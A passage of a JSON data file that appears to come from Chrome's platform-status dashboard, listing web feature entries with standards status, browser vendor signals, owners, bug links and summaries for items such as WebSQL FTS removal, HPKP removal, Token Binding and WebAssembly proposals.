    "summary": "The canvas 2d context has the globalCompositeOperation attribute that is used to set the current compositing and blending operator.",
    "id": 6119881720201216,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API/Tutorial/Compositing"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:46.251170",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove word-wrap and -webkit-line-break styles on contenteditable containers.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": "Removed"
        },
        "owners": [
          "yoichio@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=427135",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Blink sets wordWrap: break-word and -webkit-line-break:after-white-space by default on contenteditable containers.\r\nIt breaks interoperability.",
    "id": 5644926662475776,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-11-15 01:40:41.726960"
    },
    "name": "Disable recursive use of NodeFilter functions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://dom.spec.whatwg.org/#concept-traversal-active",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/whatwg/dom/pull/359",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": "Enabled by default"
        },
        "owners": [
          "rakina@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=753271",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/13137309/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=175312",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The spec for node filtering steps was recently updated, adding active flags to avoid recursive invocations of the node traversal function from user-provided NodeFilter functions (in createNodeIterator and createTreeWalker)\r\n\r\nThis is an internal change that adds the active flag property and the active flag checks in the node filtering steps. After this change, user-provided node filter functions can't call another traversal function from within the filter function anymore.",
    "id": 5091201086652416,
    "resources": {
      "samples": [
        "http://jsbin.com/zadepacate/edit?html,console"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-07-17 17:41:21.091720",
      "by": "jmedley@google.com"
    },
    "name": "FTS extension support in WebSQL",
    "comments": "Firefox and Edge have not shipped (and do not plan to ship) WebSQL, so the removal of the FTS extension does not apply to them.\r\n\r\nUse counter shipped in M60: https://www.chromestatus.com/metrics/feature/timeline/popularity/1980",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://dev.w3.org/html5/webdatabase/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://caniuse.com/#feat=sql-storage",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": "Removed"
        },
        "owners": [
          "pwnall@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Storage>WebSQL"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=742518",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://caniuse.com/#feat=sql-storage",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WebKit/webkit/commit/36ce0a5e2dc2def273c011bef04e58da8129a7d6",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "WebSQL was implemented in WebKit and Blink as a thin layer on top of SQLite. WebSQL has failed to get traction with other browsers, and the work on the standard has been discontinued.\r\n\r\nDue to the SQLite implementation, WebSQL exposes a full text search extension (FTS3) which has proven difficult to maintain. WebKit has removed FTS support from its WebSQL implementation. Given its low usage, we would like to do the same.",
    "id": 5669618848890880,
    "resources": {
      "samples": [
        "https://gist.github.com/nolanlawson/0264938033aca2201012"
      ]
    }
  },
  {
    "category": "Offline / Storage",
    "updated": {
      "when": "2017-07-13 20:36:00.803730",
      "by": "pwnall@chromium.org"
    },
    "name": "Full text search (FTS) support in WebSQL",
    "tags": [
      "websql",
      "fts"
    ],
    "comments": "Firefox and Edge have never shipped (and do not plan to ship) WebSQL.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://caniuse.com/#feat=sql-storage",
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": "Removed"
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "http://caniuse.com/#feat=sql-storage",
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/WebKit/webkit/commit/36ce0a5e2dc2def273c011bef04e58da8129a7d6",
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "WebSQL is a discontinued standard that was only implemented by WebKit and Blink as a thin layer on top of SQLite. The implementation has exposed SQLITE-specific constructs, such as a full text search extension (FTS3).\r\n\r\nMaintaining WebSQL's FTS support has been troublesome, and Safari removed it. Given the lack of usage, we would like to follow suit. Use counter added in M60: https://www.chromestatus.com/metrics/feature/timeline/popularity/1980",
    "id": 5665629579247616,
    "resources": {
      "docs": [
        "https://www.html5rocks.com/en/tutorials/webdatabase/websql-indexeddb/"
      ],
      "samples": [
        "https://gist.github.com/nolanlawson/0264938033aca2201012"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2018-04-09 17:53:15.443990",
      "by": "jmedley@google.com"
    },
    "name": "GamePad API: GamepadButton touched attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/gamepad/#dom-gamepadbutton-touched",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://wpt.fyi/gamepad/idlharness.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "bajones@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>GamepadAPI"
        ],
        "flag": true,
        "bug": "https://crbug.com/830140",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://wpt.fyi/gamepad/idlharness.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provides the touched state of a gamepad button, which indicates whether a finger is on a button independent of whether it's being pressed. ",
    "id": 5727206521176064,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:47.443830",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Blocking the load of cross-origin, parser-blocking scripts inserted via document.write for users on slow connections",
    "tags": [
      "intervention"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": "Browser Intervention"
        },
        "owners": [
          "kenjibaheux@chromium.org",
          "shivanisha@chromium.org",
          "bmcquade@chromium.org",
          "jkarlin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=640846",
        "intervention": true
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A follow-up to https://www.chromestatus.com/feature/5718547946799104 where the intervention is applied for users on effectively slow connections.",
    "id": 5652436521844736,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/17",
        "https://docs.google.com/document/d/1dMJRQKTw75ZNdknP3pirSBH3koPl_IWHnxlcBuu4t_c/edit?usp=sharing",
        "https://docs.google.com/document/d/1FSegTIN91btRwPCIrt6s3X63cdOJmNjcr0p2mhlOAW8/edit?usp=sharing",
        "https://docs.google.com/document/d/1AtS83d9joGj-xmt_pZB4Uvvn_9d1aEReRg0rI_5runw/edit#",
        ""
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:29:03.582640",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Unblocking Scrolling for Unresponsive Main Threads",
    "comments": "Other browsers don't implement this precise intervention, but we do see interventions meant to address the same issue.\r\n\r\nSafari:\r\nSafari has some odd behavior around touch event handlers cancellability when the main thread is busy, but it isn’t consistent.\r\n\r\nEdge:\r\nEdge appears to have something equivalent to the Touch Ack Timeout (verified experimentally on http://rbyers.github.io/touch-timeout.html)\r\n\r\nFirefox:\r\nThe \"APZ content response timeout\" is equivalent to our Touch Ack Timeout.",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "tdresser@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Input"
        ],
        "flag": true,
        "bug": "http://crbug.com/684703",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Identify cases where a user touch scroll is likely to be blocked on the main thread for a long time, and force the touch events to be uncancellable, allowing the scroll to occur on the compositor without blocking on main.\r\n\r\nThis will replace the existing Touch Ack Timeout.",
    "id": 5754213783044096,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1_P6dw4YXePVXssUhg4DicU7T2f-6rt7A1OxniLvDtzo/edit#"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:57.219400",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: require a user gesture to add an entry to the back/forward list",
    "tags": [
      "Intervention",
      "back",
      "history",
      "navigation",
      "annoyance"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/WICG/interventions/issues/21",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "japhet@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink-Loader"
        ],
        "flag": true,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=638198",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "We've observed websites abusing (or misusing) History.\r\n\r\nTypically, the History get stuffed with multiple dummy entries that fast-forward the user back to the page they wanted to leave. \r\n\r\nGetting back to the desired history entry is extremely hard. Because of the instant fast-forwarding nature of the dummy history entries, the user can't wait for a visual confirmation to know when to stop hitting the back button. As a result, the user either overshoot or undershoot its destination.",
    "id": 5712153302532096,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:12.791850",
      "by": "ericbidelman@google.com"
    },
    "name": "Mixed Content",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webappsec/specs/mixedcontent/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": "Enabled by default"
        },
        "owners": [
          "tsepez@chromium.org",
          "mkwst@chromium.org",
          "palmer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "User agents disallow rendering and execution of content loaded over unencrypted or unauthenticated connections in the context of an encrypted and authenticated document. In short, the less HTTP in HTTPS documents, the better.",
    "id": 6263395770695680,
    "resources": {}
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:46.883700",
      "by": "ericbidelman@google.com"
    },
    "name": "Non-standard DeviceOrientation Event initialization functions",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/deviceorientation/spec-source-orientation.html",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://github.com/w3c/deviceorientation/issues/35#issuecomment-286608967",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": "Removed"
        },
        "owners": [
          "reillyg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "IO>DeviceOrientation"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=697598",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/w3c/deviceorientation/issues/35#issuecomment-286604972",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://github.com/w3c/deviceorientation/issues/35#issuecomment-284604721",
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the DeviceOrientationEvent.initDeviceOrientationEvent and DeviceMotionEvent.initDeviceMotionEvent functions.\r\n\r\nThese methods are not defined in the DeviceOrientation Event specification. Measurements indicate that they have no usage and they can be entirely replaced by the DeviceOrientationEvent and DeviceMotionEvent constructors that are being shipped in parallel to this removal.",
    "id": 5650190849540096,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-12 19:31:36.319100",
      "by": "jmedley@google.com"
    },
    "name": "Remove HTTP-Based Public Key Pinning",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/rfc7469",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": "Deprecated"
        },
        "owners": [
          "palmer@chromium.org",
          "estark@chromium.org",
          "rsleevi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Security"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=779166",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "We expect to remove support for HPKP in Chrome 69.\r\n\r\nHTTP-Based Public Key Pinning (HPKP) was intended to allow websites to send an HTTP header that pins one or more of the public keys present in the site's certificate chain.\r\n\r\nIt has very low adoption, and although it provides security against certificate misissuance, it also creates risks of denial of service and hostile pinning. See https://groups.google.com/a/chromium.org/d/msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ for more details.",
    "id": 5903385005916160,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-09-01 14:28:51.971000",
      "by": "guidou@chromium.org"
    },
    "name": "Remove Insecure usage of the Speech Recognition API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": "Enabled by default"
        },
        "owners": [
          "guidou@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>SpeechRecognition?"
        ],
        "flag": false,
        "bug": "http://crbug.com/761371",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove access to the Speech Recognition API on insecure origins. This will prevent sites from requesting access to speech recognition over HTTP.\r\nIn practice, sites using the Speech Recognition API must already be on secure origins because the API requires access to the microphone, which is allowed only on secure origins.\r\n",
    "id": 5639479519870976,
    "resources": {
      "docs": [
        "http://www.w3.org/TR/powerful-features/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-06-21 07:17:33.165263",
      "by": "domfarolino@gmail.com"
    },
    "name": "Remove deprecated Console methods",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://console.spec.whatwg.org/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": "Deprecated"
        },
        "owners": [
          "domfarolino@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Platform>DevTools"
        ],
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=706804",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Currently in Chrome, console.timeline(), console.timelineEnd(), and console.markTimeline() are deprecated, and as a result of some discussion on the WHATWG Console Standard GitHub repository, these methods will not be making it into the spec and should be removed from implementations that support them. Right now Chrome is the only implementation that supports these console methods.",
    "id": 5202677852012544,
    "resources": {
      "docs": [
        "https://github.com/whatwg/console/issues/27",
        "https://github.com/whatwg/console/issues/27#issuecomment-289312546"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:06.774200",
      "by": "ericbidelman@google.com"
    },
    "name": "Strict Mixed Content Checking",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec/specs/mixedcontent/#strict-checking",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": true,
        "bug": "https://crbug.com/442662",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In order to give authors assurance that mixed content will never degrade the security UI presented to their users, authors may choose to enable a stricter variant of mixed content checking which will both block optionally-blockable and blockable mixed content, and suppress the user override options.",
    "id": 5823679871057920,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-06-20 18:59:44.575501",
      "by": "nharper@google.com"
    },
    "name": "Token Binding",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-tokbind-protocol-16",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1363987",
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "nharper@chromium.org",
          "awhalley@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": true,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=596699",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://docs.microsoft.com/en-us/windows-server/security/token-binding/introducing-token-binding",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Token binding allows servers to cryptographically bind bearer tokens (such as cookies) to the TLS layer, to prevent attacks where an attacker exports a bearer token from the user's machine to present to a web service and impersonate the user.",
    "id": 5097603234529280,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Ta3GlT_LrqAOLV217Kutn3B2trvifStxB0CThQ_kk78/edit?pli=1#heading=h.e51v5eatk0f3"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:09.042510",
      "by": "ericbidelman@google.com"
    },
    "name": "Uniform Subscription API",
    "tags": [
      "subscribe",
      "uniform",
      "extension"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "orglofch@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "flag": true,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=422978&q=orglofch&colspec=ID%20Pri%20M%20Iteration%20ReleaseBlock%20Cr%20Status%20Owner%20Summary%20OS%20Modified",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The API would allow users to subscribe to a set of input uniforms which would be automatically populated in their shaders. Decreases perceived latency for operations performed against these uniforms.",
    "id": 5969019181989888,
    "resources": {
      "docs": [
        "https://docs.google.com/a/chromium.org/document/d/1lpmqPY4xVZwPzXV3Mgw0cQu8g3pl2EBq3QjTrJgFPag"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:33:29.936390",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly Import/Export Mutable Globals",
    "tags": [
      "wasm",
      "webassembly",
      "threads",
      "shared libraries"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/WebAssembly/mutable-global",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1457055",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "binji@chromium.org",
          "hablich@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": true,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=7625",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows WebAssembly modules to import and export mutable globals. This building block will allow efficient passing of values like shadow stacks pointers between dynamically liked modules (especially in the multi-threaded case).\r\n",
    "id": 5754634769530880,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/mutable-global/blob/master/proposals/mutable-global/Overview.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-09 14:38:52.460800",
      "by": "bradnelson@google.com"
    },
    "name": "WebAssembly Multi-Value",
    "tags": [
      "wasm",
      "webassembly",
      "multi-value"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://github.com/WebAssembly/multi-value",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "kschimpf@chromium.org",
          "titzer@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>JavaScript>WebAssembly"
        ],
        "flag": true,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=6672",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/issues/3478",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add support for WebAssembly functions and blocks that return more than one value.\r\n",
    "id": 5192420329259008,
    "resources": {
      "docs": [
        "https://github.com/WebAssembly/multi-value/blob/master/proposals/multi-value/Overview.md"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-05-22 14:14:32.621650",
      "by": "jmedley@google.com"
    },
    "name": "WebAssembly Non-trapping Conversion",
    "tags": [
      "wasm",
      "webassembly"
    ],
    "comments": "Supported in WebAssembly toolchain, pass: -mnontrapping-fptoint",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/WebAssembly/nontrapping-float-to-int-conversions",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1435369",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": "Behind a flag"
        },
        "owners": [
          "bradnelson@chromium.org",
